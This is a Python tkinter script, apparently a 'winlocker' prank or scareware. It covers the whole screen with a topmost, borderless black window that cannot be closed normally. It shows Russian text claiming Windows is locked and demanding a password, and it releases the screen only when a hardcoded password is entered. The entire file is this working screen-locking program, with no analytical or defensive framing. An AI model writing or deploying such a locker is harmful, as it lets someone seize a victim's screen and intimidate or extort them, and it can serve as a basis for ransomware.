from tkinter import *

root = Tk()

def Quit():
    pass

def CheckPassword(arg):
    if password.get() == ("13372024777"):
        exit()

X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

bg = "black"
font = "Arial 25 bold"

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", Quit)
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)

Label(text="Windows заблокирован!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведите пароль ниже", fg="white", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
root.mainloop()